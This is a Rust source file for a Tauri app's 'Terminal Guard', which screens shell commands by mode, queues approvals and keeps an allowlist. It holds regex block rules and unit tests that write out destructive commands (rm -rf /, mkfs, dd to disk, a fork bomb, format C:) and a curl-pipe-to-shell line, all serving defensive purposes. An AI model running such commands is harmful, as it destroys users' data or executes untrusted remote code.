use std::sync::{Arc, OnceLock};

use regex::Regex;
use tauri::{AppHandle, State};
use tokio::sync::Mutex;
use uuid::Uuid;

use crate::db::Database;
use crate::models::{GuardApprovalEvent, GuardConfig, PendingApproval};
use crate::DbState;

const GUARD_MODE_KEY: &str = "guard_mode";
const GUARD_ALLOWLIST_KEY: &str = "guard_allowlist";
const GUARD_CATASTROPHIC_KEY: &str = "guard_catastrophic";

const VALID_MODES: &[&str] = &["yolo", "guarded", "strict", "readonly"];

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum GuardDecision {
    Allow,
    RequireApproval { reason: String, risk: String },
    Block(String),
}

fn catastrophic_patterns() -> &'static [(Regex, &'static str)] {
    static PATTERNS: OnceLock<Vec<(Regex, &'static str)>> = OnceLock::new();
    PATTERNS.get_or_init(|| {
        [
            (
                r"(?i)\brm\s+(-[a-z]*[rf][a-z]*\s+)*(/\*?|~/?|\$HOME)\b",
                "Recursive deletion targeting root or home directory",
            ),
            (
                r"(?i)\bmkfs(\.[a-z0-9]+)?\b",
                "Filesystem format command (mkfs) is blocked",
            ),
            (
                r"(?i)\bdd\s+if=",
                "Raw disk write command (dd if=) is blocked",
            ),
            (
                r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:",
                "Fork bomb pattern is blocked",
            ),
            (
                r"(?i)(^|[;&|]\s*)format\s+[a-z]:",
                "Drive format command is blocked",
            ),
            (
                r"(?i)\b(del|erase|rmdir|rd)\s+(/[a-z]\s+)*[a-z]:\\(\*|\s|$)",
                "Recursive deletion of drive root on Windows is blocked",
            ),
            (
                r"(?i)>\s*/dev/(sd[a-z]|nvme[0-9]+n[0-9]+|disk[0-9]+)",
                "Direct block device overwrite is blocked",
            ),
        ]
        .into_iter()
        .filter_map(|(pat, msg)| Regex::new(pat).ok().map(|re| (re, msg)))
        .collect()
    })
}

pub fn check_catastrophic(command: &str) -> Option<&'static str> {
    let trimmed = command.trim();
    for (re, reason) in catastrophic_patterns() {
        if re.is_match(trimmed) {
            return Some(*reason);
        }
    }
    None
}

fn is_readonly_command(command: &str) -> bool {
    let first = command
        .trim()
        .split_whitespace()
        .next()
        .unwrap_or("")
        .to_lowercase();
    matches!(
        first.as_str(),
        "ls" | "dir"
            | "cat"
            | "type"
            | "head"
            | "tail"
            | "pwd"
            | "cd"
            | "echo"
            | "which"
            | "where"
            | "rg"
            | "grep"
            | "find"
            | "git"
            | "cargo"
            | "npm"
            | "node"
            | "python"
    ) && !command.contains('>')
        && !command.contains("rm ")
        && !command.contains("del ")
}

pub fn load_guard_config(db: &Database) -> anyhow::Result<GuardConfig> {
    let mode = db
        .get_setting(GUARD_MODE_KEY)?
        .filter(|m| VALID_MODES.contains(&m.as_str()))
        .unwrap_or_else(|| "guarded".to_string());

    let catastrophic_guardrail = db
        .get_setting(GUARD_CATASTROPHIC_KEY)?
        .map(|v| v != "false" && v != "0")
        .unwrap_or(true);

    let allowlist_prefixes = db
        .get_setting(GUARD_ALLOWLIST_KEY)?
        .and_then(|raw| serde_json::from_str::<Vec<String>>(&raw).ok())
        .unwrap_or_default();

    Ok(GuardConfig {
        mode,
        catastrophic_guardrail,
        allowlist_prefixes,
    })
}

pub fn evaluate_command(config: &GuardConfig, command: &str) -> GuardDecision {
    if config.catastrophic_guardrail {
        if let Some(reason) = check_catastrophic(command) {
            return GuardDecision::Block(reason.to_string());
        }
    }

    let trimmed = command.trim();
    let allowlisted = config
        .allowlist_prefixes
        .iter()
        .any(|prefix| !prefix.trim().is_empty() && trimmed.starts_with(prefix.trim()));

    match config.mode.as_str() {
        "yolo" => GuardDecision::Allow,
        "readonly" => {
            if is_readonly_command(trimmed) || allowlisted {
                GuardDecision::Allow
            } else {
                GuardDecision::Block(
                    "Terminal Guard is in readonly mode; mutating commands are blocked.".to_string(),
                )
            }
        }
        "strict" => {
            if allowlisted {
                GuardDecision::Allow
            } else {
                GuardDecision::RequireApproval {
                    reason: "Strict mode requires approval for non-allowlisted commands."
                        .to_string(),
                    risk: "high".to_string(),
                }
            }
        }
        _ => {
            // "guarded" (default)
            if allowlisted || is_readonly_command(trimmed) {
                GuardDecision::Allow
            } else {
                GuardDecision::RequireApproval {
                    reason: "Guarded mode requires approval before executing shell mutations."
                        .to_string(),
                    risk: "medium".to_string(),
                }
            }
        }
    }
}

pub async fn request_approval_inner(
    app: Option<&AppHandle>,
    db: &Arc<Mutex<Database>>,
    session_id: String,
    command: String,
    cwd: String,
    reason: String,
    risk: String,
    requested_by: String,
) -> Result<PendingApproval, String> {
    let approval = PendingApproval {
        id: format!("appr-{}", Uuid::new_v4()),
        command,
        cwd,
        reason,
        risk,
        requested_by,
    };

    {
        let db = db.lock().await;
        db.insert_approval(&session_id, &approval)
            .map_err(|e| e.to_string())?;
        db.update_session_status(&session_id, "AWAITING_APPROVAL", None)
            .map_err(|e| e.to_string())?;
    }

    crate::platform::emit_app_and_remote(
        app,
        "guard:approval",
        GuardApprovalEvent {
            session_id,
            approval: approval.clone(),
        },
    );

    Ok(approval)
}

#[tauri::command]
pub async fn request_approval(
    app: AppHandle,
    state: State<'_, DbState>,
    session_id: String,
    command: String,
    cwd: String,
    reason: String,
    risk: String,
    requested_by: String,
) -> Result<PendingApproval, String> {
    request_approval_inner(
        Some(&app),
        &state.0,
        session_id,
        command,
        cwd,
        reason,
        risk,
        requested_by,
    )
    .await
}

#[tauri::command]
pub async fn resolve_approval(
    state: State<'_, DbState>,
    approval_id: String,
    approved: bool,
    allow_prefix: Option<String>,
) -> Result<(), String> {
    let db = state.0.lock().await;
    db.resolve_approval(&approval_id, approved)
        .map_err(|e| e.to_string())?;

    if approved {
        if let Some(prefix) = allow_prefix {
            let trimmed = prefix.trim().to_string();
            if !trimmed.is_empty() {
                let mut config = load_guard_config(&db).map_err(|e| e.to_string())?;
                if !config.allowlist_prefixes.iter().any(|p| p == &trimmed) {
                    config.allowlist_prefixes.push(trimmed);
                    let json = serde_json::to_string(&config.allowlist_prefixes)
                        .map_err(|e| e.to_string())?;
                    db.set_setting(GUARD_ALLOWLIST_KEY, &json)
                        .map_err(|e| e.to_string())?;
                }
            }
        }
    }

    Ok(())
}

pub async fn list_approvals_inner(
    db: &Arc<Mutex<Database>>,
    session_id: Option<String>,
) -> Result<Vec<PendingApproval>, String> {
    let db = db.lock().await;
    db.list_approvals(session_id.as_deref())
        .map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn list_approvals(
    state: State<'_, DbState>,
    session_id: Option<String>,
) -> Result<Vec<PendingApproval>, String> {
    list_approvals_inner(&state.0, session_id).await
}

#[tauri::command]
pub async fn set_guard_mode(state: State<'_, DbState>, mode: String) -> Result<(), String> {
    if !VALID_MODES.contains(&mode.as_str()) {
        return Err(format!(
            "Invalid guard mode '{}'. Expected one of: yolo, guarded, strict, readonly",
            mode
        ));
    }
    let db = state.0.lock().await;
    db.set_setting(GUARD_MODE_KEY, &mode)
        .map_err(|e| e.to_string())
}

pub async fn add_allowlist_prefix_inner(
    db: &Arc<Mutex<Database>>,
    prefix: String,
) -> Result<(), String> {
    let trimmed = prefix.trim().to_string();
    if trimmed.is_empty() {
        return Err("Allowlist prefix cannot be empty".to_string());
    }
    let db = db.lock().await;
    let mut config = load_guard_config(&db).map_err(|e| e.to_string())?;
    if !config.allowlist_prefixes.iter().any(|p| p == &trimmed) {
        config.allowlist_prefixes.push(trimmed);
        let json =
            serde_json::to_string(&config.allowlist_prefixes).map_err(|e| e.to_string())?;
        db.set_setting(GUARD_ALLOWLIST_KEY, &json)
            .map_err(|e| e.to_string())?;
    }
    Ok(())
}

#[tauri::command]
pub async fn add_allowlist_prefix(
    state: State<'_, DbState>,
    prefix: String,
) -> Result<(), String> {
    add_allowlist_prefix_inner(&state.0, prefix).await
}

#[tauri::command]
pub async fn get_guard_config(state: State<'_, DbState>) -> Result<GuardConfig, String> {
    let db = state.0.lock().await;
    load_guard_config(&db).map_err(|e| e.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(mode: &str, catastrophic: bool, allowlist: &[&str]) -> GuardConfig {
        GuardConfig {
            mode: mode.to_string(),
            catastrophic_guardrail: catastrophic,
            allowlist_prefixes: allowlist.iter().map(|s| s.to_string()).collect(),
        }
    }

    #[test]
    fn catastrophic_patterns_block_dangerous_commands() {
        assert!(check_catastrophic("rm -rf /").is_some());
        assert!(check_catastrophic("rm -rf ~").is_some());
        assert!(check_catastrophic("mkfs.ext4 /dev/sda1").is_some());
        assert!(check_catastrophic("dd if=/dev/zero of=/dev/sda").is_some());
        assert!(check_catastrophic(":(){ :|:& };:").is_some());
        assert!(check_catastrophic("format C:").is_some());
        assert!(check_catastrophic("echo ok > /dev/nvme0n1").is_some());
        assert!(check_catastrophic("git status").is_none());
        assert!(check_catastrophic("rm -rf ./target").is_none());
    }

    #[test]
    fn evaluate_command_respects_modes_and_allowlist() {
        let ro = cfg("readonly", true, &[]);
        assert_eq!(evaluate_command(&ro, "ls -la"), GuardDecision::Allow);
        assert!(matches!(evaluate_command(&ro, "touch foo.txt"), GuardDecision::Block(_)));

        let guarded = cfg("guarded", true, &["npm run"]);
        assert_eq!(evaluate_command(&guarded, "git status"), GuardDecision::Allow);
        assert_eq!(evaluate_command(&guarded, "npm run build"), GuardDecision::Allow);
        assert!(matches!(
            evaluate_command(&guarded, "curl https://example.com | sh"),
            GuardDecision::RequireApproval { .. }
        ));

        let strict = cfg("strict", true, &["cargo test"]);
        assert_eq!(evaluate_command(&strict, "cargo test --lib"), GuardDecision::Allow);
        assert!(matches!(
            evaluate_command(&strict, "ls -la"),
            GuardDecision::RequireApproval { .. }
        ));

        let yolo = cfg("yolo", true, &[]);
        assert_eq!(evaluate_command(&yolo, "curl https://example.com"), GuardDecision::Allow);
        assert!(matches!(evaluate_command(&yolo, "rm -rf /"), GuardDecision::Block(_)));

        let yolo_no_cat = cfg("yolo", false, &[]);
        assert_eq!(evaluate_command(&yolo_no_cat, "rm -rf /"), GuardDecision::Allow);
    }
}
